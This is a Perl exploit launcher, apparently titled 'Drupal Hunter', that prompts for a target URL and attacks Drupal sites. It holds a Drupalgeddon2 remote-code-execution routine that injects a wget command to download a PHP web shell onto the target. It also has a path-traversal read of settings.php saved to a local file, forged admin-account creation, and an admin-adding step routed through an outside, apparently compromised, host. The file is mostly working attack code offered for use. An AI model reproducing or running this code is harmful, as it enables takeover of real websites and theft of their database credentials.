#!/usr/bin/perl


use LWP::Simple;
use LWP::UserAgent;
use Term::ANSIColor;
use HTTP::Request;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);


system(($^O eq 'MSWin32') ? 'cls' : 'clear');
system(($^O eq 'MSWin32') ? 'mode con:cols=100 lines=40' : 'resize -s 40 100');
my $now_string = localtime();


print "                       ug                                                \n";
print "                       b                                                 \n";
print "                      g           bug       ____                  _      \n";
print "                      u        bug         |    \  ___ _ _ ___ ___| |     \n";
print "      bugbug          b       g            |  |  |  _| | | . | .'| |     \n";  
print "            bug      bugbug bu             |____/|_| |___|  _|__,|_|     \n";
print "               bug  bugbugbugbugbugbug                   |_|             \n";
print "  bug   bug   bugbugbugbugbugbugbugbugb       _____         _            \n";
print "     bug   bug bugbugbugbugbugbugbugbugbu    |  |  |_ _ ___| |_ ___ ___  \n";
print "   bugbugbugbu gbugbugbugbugbugbugbugbugbu   |     | | |   |  _| -_|  _| \n";
print "  bugbugbugbug                               |__|__|___|_|_|_| |___|_|   \n";
print "   bugbugbugbu gbugbugbugbugbugbugbugbugbu                               \n";
print "     bug   bug bugbugbugbugbugbugbugbugbu                                \n";
print "  bug   bug  gbugbugbugbugbugbugbugbugb         V 1.0 By dr-iman         \n";      
print "               bug  bugbugbugbugbugbug               GIST                \n";           
print "            bug      bugbug  bu                                          \n";            
print "      bugbug          b        g                                         \n";
print "                      u         bug     Time & Date : $now_string        \n";
print "                      g            bug                                   \n";
print "                       b                                                 \n";
print "                        ug                                               \n";
print "\n[";print colored("--h (Help , how to use the tool) ", 'red'),;print "]\n";
print "\nHunter > ";
$exploit=<>;
chomp($exploit);

if ($exploit eq "--h" or $exploit eq "help" or $exploit eq "--H" or $exploit eq "Help")
{
print <<help;
Exploit Title                        Description                     Command

Drupal Add New Admin                 You Can Add New Admin           drupal-csrf/add-new-admin

Drupal 'Drupalgeddon2'               Remoce Command Execution        drupal-rce/geddon-rce
7.54/.../8.5.1 RCE                   (CVE-2018-7600)

Drupal Avatar Uploader               Download important files        drupal-afd/avatar-afd
7.x-1.0-beta8 AFD                    (CVE-2018-9205)			 									 

Drupal 5.21/6.16 DOS                 0day dos issue for drupal       drupal-dos/2009-dos

Drupal 7.12 CSRF                     You Can Add new admin           drupal-csrf/2012-csrf
Add New Admin 
help
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}

elsif($exploit eq "drupal-csrf/add-new-admin" or $exploit eq "DRUPAL-CSRF/ADD-NEW-ADMIN")
{
addnewadmin();
}



elsif($exploit eq "drupal-rce/geddon-rce" or $exploit eq "DRUPAL-RCE/GEDDON-RCE")
{
geddonrce();
}



elsif($exploit eq "drupal-afd/avatar-afd" or $exploit eq "DRUPAL-AFD/AVATAR-AFD")
{
avatarafd();
}




elsif($exploit eq "drupal-dos/2009-dos" or $exploit eq "DRUPAL-DOS/2009-DOS")
{

}





elsif($exploit eq "drupal-csrf/2012-csrf" or $exploit eq "DRUPAL-CSRF/2012-CSRF")
{
csrf();
}





sub addnewadmin()
{
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);

print "\nEnter Target URL : ";
$site=<>;
chomp($site);


$drupalink = "http://jinclean.com/wp-admin/images/install.php";
my $exploit = "$drupalink?url=$site&submit=submit";
$admin ="Hunter";
$pass  ="admin";
$dr = $site . '/user/login';
$red = $site . '/user/1';
my $checkk = $ua->get("$exploit")->content;
if($checkk =~/Success!/) {
print "\nURL : $site";
print "\n
Username : Hunter
Password : admin
\n";
}
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}






sub geddonrce()
{
my $ua = LWP::UserAgent->new;

print "\nEnter Target URL : ";
$url=<>;
chomp($url);

$exploit = "$url/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax";

$ajax = "_drupa_ajax";
$mail = "mail[#post_render][]";
$maill= "mail[#type]";
$mailll = "mail[#markup]";
$wget = "wget https://raw.githubusercontent.com/dr-iman/SpiderProject/master/lib/exploits/web-app/wordpress/ads-manager/payload.php -0 shell.php";
$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => [form_id => 'user_register_form', $ajax => '1', $mail => 'exec', $maill => 'markup', $mailll => $wget]);

$shell = "$url/shell.php";
my $content = $ua->get("$shell")->content;
if ($content =~ /Spider Project/)
{
print "\nPayload Uploaded successfully $shell\n";
}
else{
print "\nTarget Is Not Vulnerable\n";    
}
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}




sub avatarafd()
{
my $ua = LWP::UserAgent->new;

print "\nEnter Target URL : ";
my $url=<>;
chomp($url);

my $exploit = "$url/sites/all/modules/avatar_uploader/lib/demo/view.php?file=../../../../../../../../../../../sites/default/settings.php";
my $content = $ua->get("$exploit")->content;
open (MYFILE, '>>data.txt');
print MYFILE $content;
close (MYFILE);
print "\nSaved in data.txt!!\n";
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}




sub dos()
{
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}







sub csrf()
{
my $ua = LWP::UserAgent->new;

print "\nEnter Target URL : ";
$url=<>;
chomp($url);

$mail = 'new_admin@new_admin.com';
$exploit = "$url/admin/people/create?render=overlay&render=overlay";
$response = $ua->post($exploit, Content-Type => 'multipart/form-data', Content => ['name' => 'new_admin', mail => $mail, 'pass[pass1]' => 'new_password', 'pass[pass2]' => 'new_password', 'status' => '1', 'roles[3]' => '3', 'timezone' => 'Europe/Prague', 'form_build_id' => 'form-oUkbOYDjyZag-LhYFHvlPXM1rJzOHCjlHojoh_hS3pY', 'form_token' => 'cU7nmlpWu-a4UKGFDBcVjEutgvoEidfK1Zgw0HFAtXc' , 'form_id' => 'user_register_form' , 'op' => 'Create new account']);

if ($response =~ /200/)
{
print "\n
Taget : $url
Username : $mail
Password : new_password
\n";
}
else{
print "\nExploit Field!\n";
}
print "\nBack To list or No(Y or N) : ";
my $let=<>;
chomp($let);
if ($let eq "y" or $let eq "Y")
{
system ("perl hunter.pl");
}
elsif ($let eq "n" or $let eq "N")
{
system "";
}
}